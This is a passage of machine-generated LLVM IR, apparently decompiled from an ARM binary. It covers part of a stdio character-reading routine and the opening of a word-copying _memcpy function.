  %v0_15918 = load i32, i32* @r0, align 4
  %v1_15918 = add i32 %v0_15918, 16
  %v2_15918 = inttoptr i32 %v1_15918 to i32*
  %v3_15918 = load i32, i32* %v2_15918, align 4
  store i32 %v3_15918, i32* %r2.global-to-local, align 4
  %v1_1591c = add i32 %v0_15918, 24
  %v2_1591c = inttoptr i32 %v1_1591c to i32*
  %v3_1591c = load i32, i32* %v2_1591c, align 4
  %v3_15920 = icmp ult i32 %v3_15918, %v3_1591c
  store i32 %v0_15918, i32* @r4, align 4
  br i1 %v3_15920, label %bb, label %dec_label_pc_15938

bb:                                               ; preds = %entry
  %v2_15928 = inttoptr i32 %v3_15918 to i8*
  %v3_15928 = load i8, i8* %v2_15928, align 1
  %v4_15928 = zext i8 %v3_15928 to i32
  store i32 %v4_15928, i32* %r0.global-to-local, align 4
  %v6_15928 = add i32 %v3_15918, 1
  store i32 %v6_15928, i32* %r2.global-to-local, align 4
  store i32 %v6_15928, i32* %v2_15918, align 4
  br label %dec_label_pc_15a38

dec_label_pc_15938:                               ; preds = %entry
  %v1_15938 = inttoptr i32 %v0_15918 to i8*
  %v2_15938 = load i8, i8* %v1_15938, align 1
  %v3_15938 = zext i8 %v2_15938 to i32
  %v1_1593c = and i32 %v3_15938, 131
  %tmp22 = icmp ugt i32 %v1_1593c, 128
  br i1 %tmp22, label %dec_label_pc_15958, label %dec_label_pc_15948

dec_label_pc_15948:                               ; preds = %dec_label_pc_15938
  store i32 128, i32* @r1, align 4
  %v0_1594c = call i32 @__stdio_trans2r_o()
  store i32 %v0_1594c, i32* %r0.global-to-local, align 4
  %v2_15950 = icmp eq i32 %v0_1594c, 0
  br i1 %v2_15950, label %dec_label_pc_15948.dec_label_pc_15958_crit_edge, label %dec_label_pc_15a34

dec_label_pc_15948.dec_label_pc_15958_crit_edge:  ; preds = %dec_label_pc_15948
  %v0_15958.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15958

dec_label_pc_15958:                               ; preds = %dec_label_pc_15948.dec_label_pc_15958_crit_edge, %dec_label_pc_15938
  %v2_159a4 = phi i32 [ %v0_15958.pre, %dec_label_pc_15948.dec_label_pc_15958_crit_edge ], [ %v0_15918, %dec_label_pc_15938 ]
  %v1_15958 = inttoptr i32 %v2_159a4 to i8*
  %v2_15958 = load i8, i8* %v1_15958, align 1
  %v3_15958 = zext i8 %v2_15958 to i32
  store i32 %v3_15958, i32* %r2.global-to-local, align 4
  %v1_1595c = add i32 %v2_159a4, 1
  %v2_1595c = inttoptr i32 %v1_1595c to i8*
  %v3_1595c = load i8, i8* %v2_1595c, align 1
  %v4_1595c = zext i8 %v3_1595c to i32
  %v4_15960 = mul nuw nsw i32 %v4_1595c, 256
  %v5_15960 = or i32 %v4_15960, %v3_15958
  store i32 %v5_15960, i32* %r2.global-to-local, align 4
  %v1_15964 = and i32 %v3_15958, 2
  %v2_15964 = icmp eq i32 %v1_15964, 0
  br i1 %v2_15964, label %dec_label_pc_15994, label %dec_label_pc_1596c

dec_label_pc_1596c:                               ; preds = %dec_label_pc_15958
  %tmp23 = urem i8 %v2_15958, 2
  %v1_1596c = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_1596c
  %v4_15970 = and i32 %tmp18, 4
  %v5_15970 = add i32 %v4_15970, %v2_159a4
  %v1_15974 = add i32 %v5_15970, 36
  %v2_15974 = inttoptr i32 %v1_15974 to i8*
  %v3_15974 = load i8, i8* %v2_15974, align 1
  %v4_15974 = zext i8 %v3_15974 to i32
  %v1_15978 = add nsw i32 %v5_15960, -1
  store i32 %v1_15978, i32* %r2.global-to-local, align 4
  %v3_1597c = sdiv i32 %v1_15978, 256
  store i32 %v3_1597c, i32* %r1.global-to-local, align 4
  store i32 %v4_15974, i32* %r0.global-to-local, align 4
  %v2_15988 = add i32 %v2_159a4, 40
  %v3_15988 = inttoptr i32 %v2_15988 to i32*
  store i32 0, i32* %v3_15988, align 4
  %v0_1598c = load i32, i32* %r1.global-to-local, align 4
  %v1_1598c = trunc i32 %v0_1598c to i8
  %v2_1598c = load i32, i32* @r4, align 4
  %v3_1598c = add i32 %v2_1598c, 1
  %v4_1598c = inttoptr i32 %v3_1598c to i8*
  store i8 %v1_1598c, i8* %v4_1598c, align 1
  br label %dec_label_pc_159c8

dec_label_pc_15994:                               ; preds = %dec_label_pc_15958
  %v1_15994 = add i32 %v2_159a4, 16
  store i32 %v1_15994, i32* %r1.global-to-local, align 4
  %v1_15998 = inttoptr i32 %v1_15994 to i32*
  %v2_15998 = load i32, i32* %v1_15998, align 4
  store i32 %v2_15998, i32* %r1.global-to-local, align 4
  %v3_15998 = add i32 %v2_159a4, 20
  %v4_15998 = inttoptr i32 %v3_15998 to i32*
  %v5_15998 = load i32, i32* %v4_15998, align 4
  %v9_1599c = icmp eq i32 %v5_15998, %v2_15998
  br i1 %v9_1599c, label %dec_label_pc_159ac, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_15994
  %v2_159a0 = inttoptr i32 %v2_15998 to i8*
  %v3_159a0 = load i8, i8* %v2_159a0, align 1
  %v4_159a0 = zext i8 %v3_159a0 to i32
  store i32 %v4_159a0, i32* %r0.global-to-local, align 4
  %v6_159a0 = add i32 %v2_15998, 1
  store i32 %v6_159a0, i32* %r1.global-to-local, align 4
  store i32 %v6_159a0, i32* %v1_15998, align 4
  br label %dec_label_pc_15a38

dec_label_pc_159ac:                               ; preds = %dec_label_pc_15994
  %v1_159ac = add i32 %v2_159a4, 4
  %v2_159ac = inttoptr i32 %v1_159ac to i32*
  %v3_159ac = load i32, i32* %v2_159ac, align 4
  %v4_159b4 = icmp eq i32 %v3_159ac, -2
  br i1 %v4_159b4, label %dec_label_pc_159b8, label %dec_label_pc_159d0

dec_label_pc_159b8:                               ; preds = %dec_label_pc_159ac
  %v1_159b8 = or i32 %v5_15960, 4
  store i32 %v1_159b8, i32* %r2.global-to-local, align 4
  store i8 %v3_1595c, i8* %v2_1595c, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_159c8

dec_label_pc_159c8:                               ; preds = %dec_label_pc_1596c, %dec_label_pc_159b8
  %v0_159c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_159c8 = trunc i32 %v0_159c8 to i8
  %v2_159c8 = load i32, i32* @r4, align 4
  %v3_159c8 = inttoptr i32 %v2_159c8 to i8*
  store i8 %v1_159c8, i8* %v3_159c8, align 1
  br label %dec_label_pc_15a38

dec_label_pc_159d0:                               ; preds = %dec_label_pc_159ac
  %v1_159d0 = and i32 %v4_15960, 768
  %v2_159d0 = icmp eq i32 %v1_159d0, 0
  br i1 %v2_159d0, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_159d0
  store i32 ptrtoint (i32** @global_var_2a89c.382 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_159d0, %bb19
  store i32 88540, i32* @lr, align 4
  %v1_159d8 = xor i1 %v2_159d0, true
  call void @__pseudo_cond_branch(i1 %v1_159d8, i32 ptrtoint (i32* @global_var_12290.845 to i32))
  %v0_159dc = load i32, i32* @r4, align 4
  %v1_159dc = add i32 %v0_159dc, 8
  store i32 %v1_159dc, i32* %r2.global-to-local, align 4
  %v1_159e0 = inttoptr i32 %v1_159dc to i32*
  %v2_159e0 = load i32, i32* %v1_159e0, align 4
  store i32 %v2_159e0, i32* %r2.global-to-local, align 4
  %v3_159e0 = add i32 %v0_159dc, 12
  %v4_159e0 = inttoptr i32 %v3_159e0 to i32*
  %v5_159e0 = load i32, i32* %v4_159e0, align 4
  %v9_159e4 = icmp eq i32 %v5_159e0, %v2_159e0
  br i1 %v9_159e4, label %dec_label_pc_15a18, label %dec_label_pc_159ec

dec_label_pc_159ec:                               ; preds = %bb20
  %v2_159ec = add i32 %v0_159dc, 24
  %v3_159ec = inttoptr i32 %v2_159ec to i32*
  store i32 %v2_159e0, i32* %v3_159ec, align 4
  %v0_159f0 = load i32, i32* @r4, align 4
  store i32 %v0_159f0, i32* %r0.global-to-local, align 4
  %v2_159f4 = call i32 @__stdio_rfill(i32 %v0_159f0)
  store i32 %v2_159f4, i32* %r0.global-to-local, align 4
  %v2_159f8 = icmp eq i32 %v2_159f4, 0
  br i1 %v2_159f8, label %dec_label_pc_15a34, label %dec_label_pc_15a00

dec_label_pc_15a00:                               ; preds = %dec_label_pc_159ec
  %v0_15a00 = load i32, i32* @r4, align 4
  %v1_15a00 = add i32 %v0_15a00, 20
  %v2_15a00 = inttoptr i32 %v1_15a00 to i32*
  %v3_15a00 = load i32, i32* %v2_15a00, align 4
  %v2_15a04 = add i32 %v0_15a00, 24
  %v3_15a04 = inttoptr i32 %v2_15a04 to i32*
  store i32 %v3_15a00, i32* %v3_15a04, align 4
  %v0_15a08 = load i32, i32* @r4, align 4
  %v1_15a08 = add i32 %v0_15a08, 16
  %v2_15a08 = inttoptr i32 %v1_15a08 to i32*
  %v3_15a08 = load i32, i32* %v2_15a08, align 4
  %v1_15a0c = inttoptr i32 %v3_15a08 to i8*
  %v2_15a0c = load i8, i8* %v1_15a0c, align 1
  %v3_15a0c = zext i8 %v2_15a0c to i32
  store i32 %v3_15a0c, i32* %r0.global-to-local, align 4
  %v5_15a0c = add i32 %v3_15a08, 1
  store i32 %v5_15a0c, i32* %v2_15a08, align 4
  br label %dec_label_pc_15a38

dec_label_pc_15a18:                               ; preds = %bb20
  %v1_15a18 = inttoptr i32 %v0_159dc to i8*
  store i32 %v0_159dc, i32* %r0.global-to-local, align 4
  %v2_15a1c = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_15a1c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_15a24 = call i32 @__stdio_READ(i8* %v1_15a18, i32 %v2_15a1c, i32 1)
  store i32 %v5_15a24, i32* %r0.global-to-local, align 4
  %v2_15a28 = icmp eq i32 %v5_15a24, 0
  br i1 %v2_15a28, label %dec_label_pc_15a34, label %bb21

bb21:                                             ; preds = %dec_label_pc_15a18
  %v4_15a2c = load i8, i8* %stack_var_-9, align 1
  %v5_15a2c = sext i8 %v4_15a2c to i32
  store i32 %v5_15a2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a38

dec_label_pc_15a34:                               ; preds = %dec_label_pc_15a18, %dec_label_pc_15948, %dec_label_pc_159ec
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a38

dec_label_pc_15a38:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_15a00, %dec_label_pc_159c8, %dec_label_pc_15a34
  %v2_15a3c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15a3c, i32* @r4, align 4
  %v8_15a3c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_15a3c

; uselistorder directives
  uselistorder i32 %v2_15998, { 1, 0, 2, 3 }
  uselistorder i32 %v3_15958, { 1, 0, 2 }
  uselistorder i32 %v2_159a4, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_15918, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i8** @global_var_2a8d4.381, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15a38, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_15a34, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_159c8, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_15a50 = load i32, i32* @r1, align 4
  %v1_15a50 = load i32, i32* %r0.global-to-local, align 4
  %v2_15a50 = sub i32 %v0_15a50, %v1_15a50
  %v3_15a50 = icmp ult i32 %v0_15a50, %v1_15a50
  %v4_15a50 = xor i32 %v1_15a50, %v0_15a50
  %v5_15a50 = xor i32 %v2_15a50, %v0_15a50
  %v6_15a50 = and i32 %v5_15a50, %v4_15a50
  %v7_15a50 = icmp slt i32 %v6_15a50, 0
  store i1 %v7_15a50, i1* %cpsr_v.global-to-local, align 1
  %v8_15a50 = icmp slt i32 %v2_15a50, 0
  store i1 %v8_15a50, i1* %cpsr_n.global-to-local, align 1
  %v9_15a50 = icmp eq i32 %v0_15a50, %v1_15a50
  store i1 %v9_15a50, i1* @cpsr_z, align 1
  br i1 %v3_15a50, label %dec_label_pc_15c9c, label %dec_label_pc_15a58

dec_label_pc_15a58:                               ; preds = %entry
  br i1 %v9_15a50, label %.thread123, label %bb

.thread123:                                       ; preds = %bb146, %.thread122, %bb143, %dec_label_pc_15a58
  %merge = phi i32 [ %v0_15a50, %dec_label_pc_15a58 ], [ %v2_15d30, %bb143 ], [ %v11_15d4c, %bb146 ], [ %v7_15d4c, %.thread122 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_15a58
  %v5_15a5c = inttoptr i32 %v1_15a50 to i8*
  store i8* %v5_15a5c, i8** %stack_var_-8, align 4
  %v0_15a60 = load i32, i32* @r2, align 4
  %v2_15a60 = add i32 %v0_15a60, -4
  store i32 %v2_15a60, i32* %r2.global-to-local, align 4
  %v4_15a60 = sub i32 3, %v0_15a60
  %v5_15a60 = and i32 %v4_15a60, %v0_15a60
  %v6_15a60 = icmp slt i32 %v5_15a60, 0
  store i1 %v6_15a60, i1* %cpsr_v.global-to-local, align 1
  %v7_15a60 = icmp slt i32 %v2_15a60, 0
  store i1 %v7_15a60, i1* %cpsr_n.global-to-local, align 1
  %v5_15a64 = icmp slt i32 %v0_15a60, 4
  br i1 %v5_15a64, label %bb133, label %dec_label_pc_15a68

dec_label_pc_15a68:                               ; preds = %bb
  %v1_15a68 = urem i32 %v1_15a50, 4
  store i32 %v1_15a68, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15a68 = icmp eq i32 %v1_15a68, 0
  br i1 %v2_15a68, label %dec_label_pc_15a70, label %dec_label_pc_15b14

dec_label_pc_15a70:                               ; preds = %dec_label_pc_15a68
  %v1_15a70 = urem i32 %v0_15a50, 4
  store i32 %v1_15a70, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15a70 = icmp eq i32 %v1_15a70, 0
  %extract.t = trunc i32 %v0_15a50 to i2
  br i1 %v2_15a70, label %dec_label_pc_15a78, label %dec_label_pc_15b44

dec_label_pc_15a78:                               ; preds = %dec_label_pc_15a70, %dec_label_pc_15b3c
  %v0_15a9093 = phi i32 [ %v1_15a50, %dec_label_pc_15a70 ], [ %v0_15b8c76, %dec_label_pc_15b3c ]
  %v0_15a8c92 = phi i32 [ %v0_15a50, %dec_label_pc_15a70 ], [ %v0_15b3c, %dec_label_pc_15b3c ]
  %v0_15a78 = phi i32 [ %v2_15a60, %dec_label_pc_15a70 ], [ %v2_15b34, %dec_label_pc_15b3c ]
  %v2_15a78 = add i32 %v0_15a78, -8
  store i32 %v2_15a78, i32* %r2.global-to-local, align 4
  %v4_15a78 = sub i32 7, %v0_15a78
  %v5_15a78 = and i32 %v4_15a78, %v0_15a78
  %v6_15a78 = icmp slt i32 %v5_15a78, 0
  store i1 %v6_15a78, i1* %cpsr_v.global-to-local, align 1
  %v7_15a78 = icmp slt i32 %v2_15a78, 0
  store i1 %v7_15a78, i1* %cpsr_n.global-to-local, align 1
  %v5_15a7c = icmp slt i32 %v0_15a78, 8
  br i1 %v5_15a7c, label %dec_label_pc_15acc, label %dec_label_pc_15a80

dec_label_pc_15a80:                               ; preds = %dec_label_pc_15a78
  %v2_15a80 = add i32 %v0_15a78, -28
  store i32 %v2_15a80, i32* %r2.global-to-local, align 4
  %v4_15a80 = sub i32 27, %v0_15a78
  %v5_15a80 = and i32 %v4_15a80, %v2_15a78
  %v6_15a80 = icmp slt i32 %v5_15a80, 0
  store i1 %v6_15a80, i1* %cpsr_v.global-to-local, align 1
  %v7_15a80 = icmp slt i32 %v2_15a80, 0
  store i1 %v7_15a80, i1* %cpsr_n.global-to-local, align 1
  %v5_15a84 = icmp slt i32 %v2_15a78, 20
  br i1 %v5_15a84, label %dec_label_pc_15ab8, label %dec_label_pc_15a88

dec_label_pc_15a88:                               ; preds = %dec_label_pc_15a80
  %v0_15a88 = load i32, i32* @r4, align 4
  store i32 %v0_15a88, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15a8c

dec_label_pc_15a8c:                               ; preds = %dec_label_pc_15a8c.dec_label_pc_15a8c_crit_edge, %dec_label_pc_15a88
  %v0_15a90 = phi i32 [ %v12_15a98, %dec_label_pc_15a8c.dec_label_pc_15a8c_crit_edge ], [ %v0_15a9093, %dec_label_pc_15a88 ]
  %v0_15a8c = phi i32 [ %v0_15a8c.pre, %dec_label_pc_15a8c.dec_label_pc_15a8c_crit_edge ], [ %v0_15a8c92, %dec_label_pc_15a88 ]
  %v1_15a8c = inttoptr i32 %v0_15a8c to i32*
  %v2_15a8c = load i32, i32* %v1_15a8c, align 4
  store i32 %v2_15a8c, i32* %r3.global-to-local, align 4
  %v3_15a8c = add i32 %v0_15a8c, 4
  %v4_15a8c = inttoptr i32 %v3_15a8c to i32*
  %v5_15a8c = load i32, i32* %v4_15a8c, align 4
  store i32 %v5_15a8c, i32* %r4.global-to-local, align 4
  %v6_15a8c = add i32 %v0_15a8c, 8
  %v7_15a8c = inttoptr i32 %v6_15a8c to i32*
  %v8_15a8c = load i32, i32* %v7_15a8c, align 4
  store i32 %v8_15a8c, i32* %ip.global-to-local, align 4
  %v9_15a8c = add i32 %v0_15a8c, 12
  %v10_15a8c = inttoptr i32 %v9_15a8c to i32*
  %v11_15a8c = load i32, i32* %v10_15a8c, align 4
  store i32 %v11_15a8c, i32* %lr.global-to-local, align 4
  %v12_15a8c = add i32 %v0_15a8c, 16
  store i32 %v12_15a8c, i32* %r1.global-to-local, align 4
  %v1_15a90 = inttoptr i32 %v0_15a90 to i32*
  store i32 %v2_15a8c, i32* %v1_15a90, align 4
  %v3_15a90 = add i32 %v0_15a90, 4
  %v4_15a90 = inttoptr i32 %v3_15a90 to i32*
  %v5_15a90 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15a90, i32* %v4_15a90, align 4
  %v6_15a90 = add i32 %v0_15a90, 8
  %v7_15a90 = inttoptr i32 %v6_15a90 to i32*
  %v8_15a90 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_15a90, i32* %v7_15a90, align 4
  %v9_15a90 = add i32 %v0_15a90, 12
  %v10_15a90 = inttoptr i32 %v9_15a90 to i32*
  %v11_15a90 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_15a90, i32* %v10_15a90, align 4
  %v12_15a90 = add i32 %v0_15a90, 16
  store i32 %v12_15a90, i32* %r0.global-to-local, align 4
  %v0_15a94 = load i32, i32* %r1.global-to-local, align 4
  %v1_15a94 = inttoptr i32 %v0_15a94 to i32*
  %v2_15a94 = load i32, i32* %v1_15a94, align 4
  store i32 %v2_15a94, i32* %r3.global-to-local, align 4
  %v3_15a94 = add i32 %v0_15a94, 4
  %v4_15a94 = inttoptr i32 %v3_15a94 to i32*
  %v5_15a94 = load i32, i32* %v4_15a94, align 4
  store i32 %v5_15a94, i32* %r4.global-to-local, align 4
  %v6_15a94 = add i32 %v0_15a94, 8
  %v7_15a94 = inttoptr i32 %v6_15a94 to i32*
  %v8_15a94 = load i32, i32* %v7_15a94, align 4
  store i32 %v8_15a94, i32* %ip.global-to-local, align 4
  %v9_15a94 = add i32 %v0_15a94, 12
  %v10_15a94 = inttoptr i32 %v9_15a94 to i32*
  %v11_15a94 = load i32, i32* %v10_15a94, align 4
  store i32 %v11_15a94, i32* @lr, align 4
  %v12_15a94 = add i32 %v0_15a94, 16
  store i32 %v12_15a94, i32* @r1, align 4
  %v1_15a98 = inttoptr i32 %v12_15a90 to i32*
  store i32 %v2_15a94, i32* %v1_15a98, align 4
  %v3_15a98 = add i32 %v0_15a90, 20
  %v4_15a98 = inttoptr i32 %v3_15a98 to i32*
  %v5_15a98 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15a98, i32* %v4_15a98, align 4
  %v6_15a98 = add i32 %v0_15a90, 24
  %v7_15a98 = inttoptr i32 %v6_15a98 to i32*
  %v8_15a98 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_15a98, i32* %v7_15a98, align 4
  %v9_15a98 = add i32 %v0_15a90, 28
  %v10_15a98 = inttoptr i32 %v9_15a98 to i32*
  %v11_15a98 = load i32, i32* @lr, align 4
  store i32 %v11_15a98, i32* %v10_15a98, align 4
  %v12_15a98 = add i32 %v0_15a90, 32
  store i32 %v12_15a98, i32* %r0.global-to-local, align 4
  %v0_15a9c = load i32, i32* %r2.global-to-local, align 4
  %v2_15a9c = add i32 %v0_15a9c, -32
  store i32 %v2_15a9c, i32* %r2.global-to-local, align 4
  %v6_15aa0 = icmp slt i32 %v0_15a9c, 32
  br i1 %v6_15aa0, label %dec_label_pc_15aa4, label %dec_label_pc_15a8c.dec_label_pc_15a8c_crit_edge

dec_label_pc_15a8c.dec_label_pc_15a8c_crit_edge:  ; preds = %dec_label_pc_15a8c
  %v0_15a8c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_15a8c

dec_label_pc_15aa4:                               ; preds = %dec_label_pc_15a8c
  %v4_15aa4 = add i32 %v0_15a9c, -16
  %v6_15aa4 = add i32 %v0_15a9c, 2147483616
  %v7_15aa4 = and i32 %v4_15aa4, %v6_15aa4
  %v8_15aa4 = icmp slt i32 %v7_15aa4, 0
  store i1 %v8_15aa4, i1* %cpsr_v.global-to-local, align 1
  %v9_15aa4 = icmp slt i32 %v4_15aa4, 0
  store i1 %v9_15aa4, i1* %cpsr_n.global-to-local, align 1
  %v5_15aa8 = icmp slt i32 %v2_15a9c, -16
  br i1 %v5_15aa8, label %.thread2, label %bb130

bb130:                                            ; preds = %dec_label_pc_15aa4
  %v6_15aa8 = load i32, i32* @r1, align 4
  %v7_15aa8 = inttoptr i32 %v6_15aa8 to i32*
  %v8_15aa8 = load i32, i32* %v7_15aa8, align 4
  store i32 %v8_15aa8, i32* %r3.global-to-local, align 4
  %v9_15aa8 = add i32 %v6_15aa8, 4
  %v10_15aa8 = inttoptr i32 %v9_15aa8 to i32*
  %v11_15aa8 = load i32, i32* %v10_15aa8, align 4
  store i32 %v11_15aa8, i32* %r4.global-to-local, align 4
  %v12_15aa8 = add i32 %v6_15aa8, 8
  %v13_15aa8 = inttoptr i32 %v12_15aa8 to i32*
  %v14_15aa8 = load i32, i32* %v13_15aa8, align 4
  store i32 %v14_15aa8, i32* %ip.global-to-local, align 4
  %v15_15aa8 = add i32 %v6_15aa8, 12
  %v16_15aa8 = inttoptr i32 %v15_15aa8 to i32*
  %v17_15aa8 = load i32, i32* %v16_15aa8, align 4
  store i32 %v17_15aa8, i32* @lr, align 4
  %v18_15aa8 = add i32 %v6_15aa8, 16
  store i32 %v18_15aa8, i32* @r1, align 4
  %v7_15aac = inttoptr i32 %v12_15a98 to i32*
  store i32 %v8_15aa8, i32* %v7_15aac, align 4
  %v9_15aac = add i32 %v0_15a90, 36
  %v10_15aac = inttoptr i32 %v9_15aac to i32*
  %v11_15aac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_15aac, i32* %v10_15aac, align 4
  %v12_15aac = add i32 %v0_15a90, 40
  %v13_15aac = inttoptr i32 %v12_15aac to i32*
  %v14_15aac = load i32, i32* %ip.global-to-local, align 4
  store i32 %v14_15aac, i32* %v13_15aac, align 4
  %v15_15aac = add i32 %v0_15a90, 44
  %v16_15aac = inttoptr i32 %v15_15aac to i32*
  %v17_15aac = load i32, i32* @lr, align 4
  store i32 %v17_15aac, i32* %v16_15aac, align 4
  %v18_15aac = add i32 %v0_15a90, 48
  store i32 %v18_15aac, i32* %r0.global-to-local, align 4
  %v6_15ab0 = load i32, i32* %r2.global-to-local, align 4
  %v7_15ab0 = add i32 %v6_15ab0, -16
  store i32 %v7_15ab0, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15aa4, %bb130
  %v3_15ac0102 = phi i32 [ %v12_15a98, %dec_label_pc_15aa4 ], [ %v18_15aac, %bb130 ]
  %v0_15ab896 = phi i32 [ %v2_15a9c, %dec_label_pc_15aa4 ], [ %v7_15ab0, %bb130 ]
  %v2_15ab4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15ab4, i32* @r4, align 4
  br label %dec_label_pc_15ab8

dec_label_pc_15ab8:                               ; preds = %dec_label_pc_15a80, %.thread2
  %v3_15ac0101 = phi i32 [ %v0_15a9093, %dec_label_pc_15a80 ], [ %v3_15ac0102, %.thread2 ]
  %v0_15ab8 = phi i32 [ %v2_15a80, %dec_label_pc_15a80 ], [ %v0_15ab896, %.thread2 ]
  %v1_15ab8 = add i32 %v0_15ab8, 20
  store i32 %v1_15ab8, i32* %r2.global-to-local, align 4
  %v3_15ab8 = sub i32 0, %v0_15ab8
  %v4_15ab8 = and i32 %v1_15ab8, %v3_15ab8
  %v5_15ab8 = icmp slt i32 %v4_15ab8, 0
  store i1 %v5_15ab8, i1* %cpsr_v.global-to-local, align 1
  %v6_15ab8 = icmp slt i32 %v1_15ab8, 0
  store i1 %v6_15ab8, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15abc

dec_label_pc_15abc:                               ; preds = %.thread118, %dec_label_pc_15ab8
  %v0_15acc.pre149 = phi i32 [ %v0_15acc.pre, %.thread118 ], [ %v1_15ab8, %dec_label_pc_15ab8 ]
  %v3_15ac0 = phi i32 [ %v3_15ac099119, %.thread118 ], [ %v3_15ac0101, %dec_label_pc_15ab8 ]
  %v1_15ac4 = phi i1 [ %v1_15ac8, %.thread118 ], [ %v5_15ab8, %dec_label_pc_15ab8 ]
  %v0_15ac4 = phi i1 [ %v0_15ac8, %.thread118 ], [ %v6_15ab8, %dec_label_pc_15ab8 ]
  %v2_15abc = xor i1 %v1_15ac4, %v0_15ac4
  br i1 %v2_15abc, label %.thread118, label %bb131

bb131:                                            ; preds = %dec_label_pc_15abc
  %v3_15abc = load i32, i32* @r1, align 4
  %v4_15abc = inttoptr i32 %v3_15abc to i32*
  %v5_15abc = load i32, i32* %v4_15abc, align 4
  store i32 %v5_15abc, i32* %r3.global-to-local, align 4
  %v6_15abc = add i32 %v3_15abc, 4
  %v7_15abc = inttoptr i32 %v6_15abc to i32*
  %v8_15abc = load i32, i32* %v7_15abc, align 4
  store i32 %v8_15abc, i32* %ip.global-to-local, align 4
  %v9_15abc = add i32 %v3_15abc, 8
  %v10_15abc = inttoptr i32 %v9_15abc to i32*
  %v11_15abc = load i32, i32* %v10_15abc, align 4
  store i32 %v11_15abc, i32* @lr, align 4
  %v12_15abc = add i32 %v3_15abc, 12
  store i32 %v12_15abc, i32* @r1, align 4
  %v4_15ac0 = inttoptr i32 %v3_15ac0 to i32*
  store i32 %v5_15abc, i32* %v4_15ac0, align 4
  %v6_15ac0 = add i32 %v3_15ac0, 4
  %v7_15ac0 = inttoptr i32 %v6_15ac0 to i32*
  %v8_15ac0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_15ac0, i32* %v7_15ac0, align 4
  %v9_15ac0 = add i32 %v3_15ac0, 8
  %v10_15ac0 = inttoptr i32 %v9_15ac0 to i32*
  %v11_15ac0 = load i32, i32* @lr, align 4
  store i32 %v11_15ac0, i32* %v10_15ac0, align 4
  %v12_15ac0 = add i32 %v3_15ac0, 12
  store i32 %v12_15ac0, i32* %r0.global-to-local, align 4
  %v3_15ac4 = load i32, i32* %r2.global-to-local, align 4
  %v4_15ac4 = add i32 %v3_15ac4, -12
  store i32 %v4_15ac4, i32* %r2.global-to-local, align 4
  %v6_15ac4 = sub i32 11, %v3_15ac4
  %v7_15ac4 = and i32 %v6_15ac4, %v3_15ac4
  %v8_15ac4 = icmp slt i32 %v7_15ac4, 0
  store i1 %v8_15ac4, i1* %cpsr_v.global-to-local, align 1
  %v9_15ac4 = icmp slt i32 %v4_15ac4, 0
  store i1 %v9_15ac4, i1* %cpsr_n.global-to-local, align 1
  br label %.thread118

.thread118:                                       ; preds = %dec_label_pc_15abc, %bb131
  %v0_15acc.pre = phi i32 [ %v4_15ac4, %bb131 ], [ %v0_15acc.pre149, %dec_label_pc_15abc ]
  %v3_15ac099119 = phi i32 [ %v12_15ac0, %bb131 ], [ %v3_15ac0, %dec_label_pc_15abc ]
  %v1_15ac8 = phi i1 [ %v8_15ac4, %bb131 ], [ %v1_15ac4, %dec_label_pc_15abc ]
  %v0_15ac8 = phi i1 [ %v9_15ac4, %bb131 ], [ %v0_15ac4, %dec_label_pc_15abc ]
  %v2_15ac8 = xor i1 %v1_15ac8, %v0_15ac8
